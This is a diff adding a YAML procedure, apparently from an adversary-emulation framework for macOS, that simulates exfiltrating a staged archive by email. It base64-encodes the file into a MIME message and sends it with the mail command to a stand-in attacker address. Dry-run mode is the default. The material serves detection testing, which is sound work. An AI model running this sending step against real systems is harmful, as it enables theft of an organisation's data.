@@ -1,0 +1,139 @@
+id: 008-email-exfiltration
+name: Email Exfiltration via Mail Command
+description: Exfiltrates data by sending files via email using the mail command
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: b8c9d0e1-f2a3-4b4c-5d6e-7f809091a2b3
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  file_path:
+    description: File to exfiltrate
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  recipient_email:
+    description: Recipient email address
+    type: string
+    default: "attacker@example.com"
+  sender_email:
+    description: Sender email address
+    type: string
+    default: "user@company.com"
+  smtp_host:
+    description: SMTP server hostname
+    type: string
+    default: "mail.example.com"
+  subject:
+    description: Email subject
+    type: string
+    default: "Document Transfer"
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Get file information
+    type: command
+    executor: bash
+    command: |
+      echo "File to exfiltrate: $(basename '{{ args.file_path }}')"
+      echo "Size: $(du -h '{{ args.file_path }}' | cut -f1)"
+      echo "Type: $(file -b '{{ args.file_path }}')"
+    cleanup: false
+  
+  - name: Prepare email
+    type: command
+    executor: bash
+    command: |
+      echo "Email Configuration:"
+      echo "  From: {{ args.sender_email }}"
+      echo "  To: {{ args.recipient_email }}"
+      echo "  Subject: {{ args.subject }}"
+      echo "  SMTP: {{ args.smtp_host }}"
+      echo "  Attachment: $(basename '{{ args.file_path }}')"
+    cleanup: false
+  
+  - name: Send email with attachment
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: Would send email via:"
+        echo "  Subject: {{ args.subject }}"
+        echo "  From: {{ args.sender_email }}"
+        echo "  To: {{ args.recipient_email }}"
+        echo "  Attachment: '{{ args.file_path }}'"
+        echo "  SMTP Server: {{ args.smtp_host }}"
+      else
+        # Create a temporary mime-formatted email
+        {
+          echo "From: {{ args.sender_email }}"
+          echo "To: {{ args.recipient_email }}"
+          echo "Subject: {{ args.subject }}"
+          echo "MIME-Version: 1.0"
+          echo "Content-Type: multipart/mixed; boundary=\"boundary123\""
+          echo ""
+          echo "--boundary123"
+          echo "Content-Type: text/plain"
+          echo ""
+          echo "Please find the attached document."
+          echo ""
+          echo "--boundary123"
+          echo "Content-Type: application/octet-stream"
+          echo "Content-Transfer-Encoding: base64"
+          echo "Content-Disposition: attachment; filename=\"$(basename '{{ args.file_path }}')\""
+          echo ""
+          base64 < '{{ args.file_path }}'
+          echo ""
+          echo "--boundary123--"
+        } | mail -S smtp={{ args.smtp_host }} -F '{{ args.sender_email }}' '{{ args.recipient_email }}'
+      fi
+    cleanup: false
+checks:
+  - name: Email address valid
+    description: Verify recipient email format
+    type: command
+    command: echo '{{ args.recipient_email }}' | grep -qE '^[^@]+@[^@]+$' && echo "Valid email"
+  
+  - name: File exists and readable
+    description: Verify file is accessible
+    type: command
+    command: test -r '{{ args.file_path }}'
+tests:
+  dry_run:
+    - name: Test email exfiltration (dry-run)
+      description: Test email preparation without sending
+      type: basic
+      steps:
+        - name: Create test file
+          type: command
+          executor: bash
+          command: echo "Sensitive email content" > /tmp/test_email.dat
+        
+        - name: Prepare email
+          type: command
+          executor: bash
+          command: |
+            echo "Email to attacker@example.com"
+            echo "Subject: Business Report"
+            echo "Attachment: test_email.dat"
+        
+        - name: Verify file
+          type: command
+          executor: bash
+          command: file /tmp/test_email.dat
+cleanup:
+  - name: Remove test file
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_email.dat
+    ignore_errors: true
